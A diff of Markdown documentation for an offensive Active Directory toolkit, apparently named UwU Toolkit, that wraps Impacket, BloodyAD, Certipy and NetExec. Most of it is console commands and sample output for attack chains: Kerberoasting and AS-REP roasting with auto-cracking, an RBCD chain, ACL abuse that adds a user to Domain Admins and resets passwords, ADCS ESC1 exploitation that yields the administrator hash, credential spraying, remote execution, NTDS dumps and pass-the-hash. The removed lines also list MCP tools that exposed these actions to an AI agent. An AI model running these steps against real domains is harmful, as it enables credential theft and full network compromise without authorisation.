@@ -104,240 +104,305 @@ ret, stdout, stderr = self.run_in_exegol(
 
 ## Impacket
 
-UwU Toolkit wraps [Impacket](https://github.com/fortra/impacket) through dedicated modules. Tools are auto-detected locally or inside Exegol — no manual path configuration needed.
+[Impacket](https://github.com/fortra/impacket) tools are wrapped as UwU modules. Set your globals once, then switch between modules without re-entering credentials.
+
+### Setup
+
+```bash
+# Set globals once for all Impacket modules
+uwu > setg RHOSTS 10.10.10.100
+uwu > setg DOMAIN corp.local
+uwu > setg USER admin
+uwu > setg PASS Password123
+```
 
 ### Modules
 
 | Module | Description |
 |--------|-------------|
-| `ad/kerberoast` | Kerberoast — find and crack service account tickets |
-| `ad/asreproast` | AS-REP Roast — crack accounts without pre-auth |
+| `ad/kerberoast` | Kerberoast — extract TGS tickets for offline cracking |
+| `ad/asreproast` | AS-REP Roast — extract hashes for accounts without pre-auth |
 | `ad/targeted_kerberoast` | Kerberoast a specific user via SPN manipulation |
-| `ad/kerb_userenum` | Enumerate valid usernames via Kerberos |
+| `ad/kerb_userenum` | Enumerate valid domain usernames via Kerberos |
 | `ad/delegation_exploit` | Exploit constrained/unconstrained delegation |
-| `ad/rbcd_auto` | Full RBCD attack chain (add computer, set delegation, get ticket) |
+| `ad/rbcd_auto` | Full RBCD attack chain (add computer, set delegation, impersonate) |
 
-### Examples
+### Kerberoast
 
 ```bash
-# Kerberoast
 uwu > use ad/kerberoast
-uwu kerberoast > set RHOSTS 10.10.10.100
-uwu kerberoast > set DOMAIN corp.local
-uwu kerberoast > set USER admin
-uwu kerberoast > set PASS Password123
+uwu kerberoast > options
+
+  Name          Current     Required  Description
+  ----          -------     --------  -----------
+  RHOSTS        10.10.10.1  yes       Domain Controller IP
+  DOMAIN        corp.local  yes       Domain name
+  USER          admin       yes       Domain username
+  PASS          Password123 yes       Domain password
+  TARGET_USER                no       Specific user to kerberoast
+  OUTPUT        kerberoast  no       Output file for hashes
+  AUTO_CRACK    no           no       Automatically crack via SSH
+
 uwu kerberoast > run
-
-# AS-REP Roast
-uwu > use ad/asreproast
-uwu asreproast > set RHOSTS 10.10.10.100
-uwu asreproast > set DOMAIN corp.local
-uwu asreproast > run
-
-# RBCD attack chain
-uwu > use ad/rbcd_auto
-uwu rbcd_auto > set RHOSTS 10.10.10.100
-uwu rbcd_auto > set DOMAIN corp.local
-uwu rbcd_auto > set USER admin
-uwu rbcd_auto > set PASS Password123
-uwu rbcd_auto > set TARGET_COMPUTER DC01$
-uwu rbcd_auto > run
 ```
 
-### MCP Tools
+### AS-REP Roast
 
-When using UwU Toolkit via the MCP server, Impacket tools are available directly:
+```bash
+uwu > use ad/asreproast
+uwu asreproast > run    # globals already set
+```
 
-| MCP Tool | Description |
-|----------|-------------|
-| `impacket_secretsdump` | Dump SAM/LSA/NTDS credentials |
-| `impacket_psexec` | Remote execution via SMB service |
-| `impacket_wmiexec` | Remote execution via WMI |
-| `impacket_smbexec` | Remote execution via SMB |
-| `impacket_dcomexec` | Remote execution via DCOM |
-| `impacket_getTGT` | Request a Kerberos TGT |
-| `impacket_getST` | Request a service ticket (S4U2Self/Proxy) |
-| `impacket_GetUserSPNs` | Kerberoast |
-| `impacket_GetNPUsers` | AS-REP Roast |
-| `impacket_addcomputer` | Add a machine account |
-| `impacket_rbcd` | Manage RBCD delegation |
-| `impacket_dacledit` | Edit DACLs on AD objects |
-| `impacket_findDelegation` | Find delegation configurations |
-| `impacket_mssqlclient` | Connect to MSSQL |
-| `impacket_smbclient` | Connect to SMB shares |
-| `impacket_lookupsid` | SID/RID brute-force enumeration |
-| `impacket_GetLAPSPassword` | Read LAPS passwords |
-| `impacket_GetGPPPassword` | Extract GPP passwords from SYSVOL |
+### Delegation Exploit
+
+```bash
+uwu > use ad/delegation_exploit
+uwu delegation_exploit > options
+
+  Name              Current       Required  Description
+  ----              -------       --------  -----------
+  RHOSTS            10.10.10.1    yes       Domain Controller IP
+  DOMAIN            corp.local    yes       Domain name
+  USER              admin         yes       Domain username
+  PASS              Password123   yes       Domain password
+  DELEGATION_TYPE   auto          no       auto, constrained, unconstrained, rbcd
+  TARGET                          no       Specific delegation target
+  IMPERSONATE       administrator no       User to impersonate
+  ACTION            auto          no       auto, enumerate, exploit
+
+uwu delegation_exploit > set TARGET svc_sql
+uwu delegation_exploit > run
+```
+
+### RBCD Attack Chain
+
+```bash
+uwu > use ad/rbcd_auto
+uwu rbcd_auto > set TARGET DC01$
+uwu rbcd_auto > set IMPERSONATE administrator
+uwu rbcd_auto > run
+
+[*] Step 1: Adding fake computer FAKECOMP$...
+[+] Computer added
+[*] Step 2: Setting RBCD on DC01$...
+[+] Delegation configured
+[*] Step 3: Requesting service ticket as administrator...
+[+] Ticket saved to /tmp/rbcd_auto/administrator.ccache
+```
+
+### Auto-Crack Integration
+
+Kerberoast and AS-REP modules can auto-crack hashes via SSH:
+
+```bash
+uwu kerberoast > set AUTO_CRACK yes
+uwu kerberoast > set SSH_HOST gpu-box
+uwu kerberoast > set WORDLIST /opt/rockyou.txt
+uwu kerberoast > run
+
+[+] 3 hashes extracted
+[*] Sending to gpu-box for cracking...
+[+] Cracked: svc_sql:Password1
+```
 
 ---
 
 ## BloodyAD
 
-UwU Toolkit integrates [BloodyAD](https://github.com/CravateRouge/bloodyAD) for ACL enumeration and abuse.
+[BloodyAD](https://github.com/CravateRouge/bloodyAD) is wrapped as a UwU module for ACL enumeration and abuse. Globals provide the authentication — you only set the target-specific options.
 
 ### Module
 
 ```bash
 uwu > use ad/bloodyad_validate
-uwu bloodyad_validate > set RHOSTS 10.10.10.100
-uwu bloodyad_validate > set DOMAIN corp.local
-uwu bloodyad_validate > set USER admin
-uwu bloodyad_validate > set PASS Password123
+uwu bloodyad_validate > options
+
+  Name          Current      Required  Description
+  ----          -------      --------  -----------
+  RHOSTS        10.10.10.1   yes       Domain Controller IP
+  DOMAIN        corp.local   yes       Domain name
+  USER          admin        yes       Domain username
+  PASS          Password123  yes       Domain password
+  TARGET_USER                no       Target user for object queries
+  TARGET_GROUP               no       Target group for membership queries
+  TARGET_OU                  no       Target OU for children queries
+  MODE          read         no       Test mode: tools_only, read, full
+
+uwu bloodyad_validate > set MODE read
 uwu bloodyad_validate > run
+
+[*] Testing BloodyAD read operations...
+[+] get writable: 12 writable objects found
+[+] get object admin: attributes retrieved
+[+] get membership admin: 3 groups
 ```
 
-### MCP Tool
-
-The `bloodyad` MCP tool exposes all BloodyAD actions:
-
-| Action | Subcommands | Use |
-|--------|-------------|-----|
-| `get` | `writable`, `owned`, `object`, `membership`, `children`, `search` | Enumerate ACLs and objects |
-| `add` | `genericAll`, `dcsync`, `groupMember`, `computer`, `shadowCredentials`, `rbcd` | Grant permissions |
-| `set` | `password`, `owner`, `object`, `uac` | Modify objects |
-| `remove` | `genericAll`, `dcsync`, `groupMember` | Revoke permissions |
-
-### Common Operations
+### Full ACL Abuse Mode
 
 ```bash
-# Find what you can write to
-uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 get writable
+uwu bloodyad_validate > set MODE full
+uwu bloodyad_validate > set TARGET_USER victim
+uwu bloodyad_validate > set TARGET_GROUP "Domain Admins"
+uwu bloodyad_validate > run
 
-# Grant DCSync rights
-uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 add dcsync TARGET TRUSTEE
-
-# Add user to group
-uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 add groupMember GROUP USER
-
-# Force password reset
-uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 set password TARGET 'NewPass!'
-
-# Shadow Credentials
-uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 add shadowCredentials TARGET
+[*] Testing BloodyAD write operations...
+[+] add groupMember: victim added to Domain Admins
+[+] set password: victim password reset
+[+] add shadowCredentials: key credential added
 ```
 
 ---
 
 ## Certipy
 
-UwU Toolkit wraps [Certipy](https://github.com/ly4k/Certipy) for ADCS enumeration and exploitation with modules for discovery, exploitation, and full automation.
+[Certipy](https://github.com/ly4k/Certipy) is wrapped in three modules for ADCS — from discovery to full exploitation. Globals handle authentication.
 
 ### Modules
 
 | Module | Description |
 |--------|-------------|
-| `ad/certipy_find` | Find vulnerable ADCS templates |
+| `ad/certipy_find` | Discover vulnerable ADCS templates |
 | `ad/certipy_exploit` | Request certs and authenticate as target users |
-| `ad/adcs_auto` | Automated scan + exploit (ESC1/2/3/6/9) |
+| `ad/adcs_auto` | Automated end-to-end scan + exploit (ESC1/2/3/6/9) |
 
-### Examples
-
-**Find vulnerable templates:**
+### Find Vulnerable Templates
 
 ```bash
 uwu > use ad/certipy_find
-uwu certipy_find > set RHOSTS 10.10.10.100
-uwu certipy_find > set DOMAIN corp.local
-uwu certipy_find > set USER admin
-uwu certipy_find > set PASS Password123
+uwu certipy_find > options
+
+  Name             Current       Required  Description
+  ----             -------       --------  -----------
+  RHOSTS           10.10.10.1    yes       Domain Controller IP
+  DOMAIN           corp.local    yes       Domain name
+  USER             admin         yes       Domain username
+  PASS             Password123   yes       Domain password
+  VULNERABLE_ONLY  yes           no       Only show vulnerable templates
+  OUTPUT           certipy_out   no       Output file prefix
+
 uwu certipy_find > run
+
+[*] Enumerating ADCS templates...
+[+] CA: CORP-DC01-CA
+[+] ESC1: WebServer — enrollee supplies SAN
+[+] ESC4: DevTemplate — tyrion has WritePKIEnrollmentFlag
 ```
 
-**Exploit ESC1:**
+### Exploit a Vulnerable Template
 
 ```bash
 uwu > use ad/certipy_exploit
-uwu certipy_exploit > set RHOSTS 10.10.10.100
-uwu certipy_exploit > set DOMAIN corp.local
-uwu certipy_exploit > set USER admin
-uwu certipy_exploit > set PASS Password123
-uwu certipy_exploit > set CA CORP-CA
-uwu certipy_exploit > set TEMPLATE VulnTemplate
+uwu certipy_exploit > set CA CORP-DC01-CA
+uwu certipy_exploit > set TEMPLATE WebServer
 uwu certipy_exploit > set TARGET_USER administrator
 uwu certipy_exploit > run
+
+[*] Requesting certificate for administrator@corp.local...
+[+] Certificate saved to administrator.pfx
+[*] Authenticating with certificate...
+[+] Got NT hash for administrator
 ```
 
-**Automated full chain:**
+### Automated Full Chain
 
 ```bash
 uwu > use ad/adcs_auto
-uwu adcs_auto > set RHOSTS 10.10.10.100
-uwu adcs_auto > set DOMAIN corp.local
-uwu adcs_auto > set USER admin
-uwu adcs_auto > set PASS Password123
-uwu adcs_auto > run
+uwu adcs_auto > run    # globals already set
+
+[*] Phase 1: Scanning for vulnerable templates...
+[*] Phase 2: Best path: ESC1 via WebServer
+[*] Phase 3: Requesting cert as administrator...
+[+] Domain Admin hash obtained
 ```
-
-### MCP Tools
-
-| MCP Tool | Description |
-|----------|-------------|
-| `certipy_find` | Enumerate templates and find ESC vulnerabilities |
-| `certipy_req` | Request certificates with alternate UPN/DNS |
-| `certipy_auth` | Authenticate with a PFX certificate to get NT hash or TGT |
-| `certipy_shadow` | Shadow Credentials attack (add key creds, request cert, authenticate) |
-
-### Supported ESC Types
-
-ESC1, ESC2, ESC3, ESC6, ESC9 — the `adcs_auto` module handles all of these end-to-end.
 
 ---
 
 ## NetExec
 
-UwU Toolkit integrates [NetExec](https://github.com/Pennyw0rth/NetExec) (nxc) for multi-protocol credential testing and enumeration. Available as both a console shortcut and MCP tool.
+[NetExec](https://github.com/Pennyw0rth/NetExec) is available as both a full UwU module and a console shortcut. The module uses the same `set`/`run` workflow as everything else.
+
+### Module
+
+```bash
+uwu > use ad/netexec
+uwu netexec > options
+
+  Name                Current       Required  Description
+  ----                -------       --------  -----------
+  RHOSTS              10.10.10.1    yes       Target host(s) - IP, range, or CIDR
+  DOMAIN              corp.local    no       Domain name
+  USER                admin         no       Username or user file
+  PASS                Password123   no       Password, hash, or password file
+  PROTOCOL            smb           no       smb, ldap, winrm, rdp, mssql, ssh, wmi
+  ACTION              check         no       check, shares, users, groups, sessions, ...
+  AUTH_TYPE            password      no       password, hash, aesKey
+  EXECUTE                           no       Command to execute on target
+  EXEC_TYPE            cmd          no       cmd or powershell
+  NXC_MODULE                        no       NetExec module to run (-M)
+  NXC_MODULE_OPTIONS                no       Module options (key=value)
+  CONTINUE_ON_SUCCESS  no           no       Continue after finding valid creds
+
+uwu netexec > set ACTION shares
+uwu netexec > run
+
+  SMB  10.10.10.100  CORP  [+] admin:Password123
+  SMB  10.10.10.100  CORP  ADMIN$     READ,WRITE
+  SMB  10.10.10.100  CORP  C$         READ,WRITE
+  SMB  10.10.10.100  CORP  SYSVOL     READ
+```
+
+### Credential Spraying
+
+```bash
+uwu netexec > set RHOSTS 10.10.10.0/24
+uwu netexec > set USER users.txt
+uwu netexec > set PASS passwords.txt
+uwu netexec > set CONTINUE_ON_SUCCESS yes
+uwu netexec > set ACTION check
+uwu netexec > run
+```
+
+### Remote Execution
+
+```bash
+uwu netexec > set ACTION execute
+uwu netexec > set EXECUTE "whoami /all"
+uwu netexec > run
+```
+
+### NTDS Dump
+
+```bash
+uwu netexec > set ACTION ntds
+uwu netexec > run
+```
+
+### LAPS via Module
+
+```bash
+uwu netexec > set PROTOCOL ldap
+uwu netexec > set NXC_MODULE laps
+uwu netexec > set LAPS_COMPUTER DC01
+uwu netexec > run
+```
+
+### Pass-the-Hash
+
+```bash
+uwu netexec > set AUTH_TYPE hash
+uwu netexec > set PASS aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+uwu netexec > set ACTION check
+uwu netexec > run
+```
 
 ### Console Shortcut
 
-The `nxc` command is available directly in the UwU console:
+The `nxc` command also works directly for quick one-off checks:
 
 ```bash
-# Validate credentials
-uwu > nxc smb 10.10.10.100 -u admin -p Password123 -d corp.local
-
-# Enumerate shares
 uwu > nxc smb 10.10.10.100 -u admin -p Password123 --shares
-
-# Enumerate users
-uwu > nxc smb 10.10.10.100 -u admin -p Password123 --users
-
-# Spray credentials
-uwu > nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
-
-# Execute commands
-uwu > nxc smb 10.10.10.100 -u admin -p Password123 -x "whoami"
-
-# Dump NTDS
-uwu > nxc smb 10.10.10.100 -u admin -p Password123 --ntds
-
-# Read LAPS
 uwu > nxc ldap 10.10.10.100 -u admin -p Password123 -M laps
-
-# Pass-the-hash
-uwu > nxc smb 10.10.10.100 -u admin -H aad3b435:31d6cfe0d16ae931b73c59d7e0c089c0
 ```
-
-### Common Actions
-
-| Action | Description |
-|--------|-------------|
-| `--shares` | List SMB shares with access levels |
-| `--users` | Enumerate domain users |
-| `--groups` | Enumerate domain groups |
-| `--sessions` | List active sessions |
-| `--sam` / `--lsa` / `--ntds` | Dump credentials |
-| `--rid-brute` | RID brute-force user enumeration |
-| `--pass-pol` | Dump password policy |
-| `-x "cmd"` / `-X "cmd"` | Execute cmd / PowerShell |
-| `-M module` | Run a NetExec module (laps, gmsa, spider_plus, etc.) |
-
-### Protocols
-
-SMB, LDAP, WinRM, RDP, MSSQL, SSH, WMI
-
-### MCP Tool
-
-The `netexec` MCP tool supports all protocols and actions with parameters for `target`, `protocol`, `domain`, `username`, `password`, `hashes`, `action`, `module`, `execute`, and more.
 
 ---
 
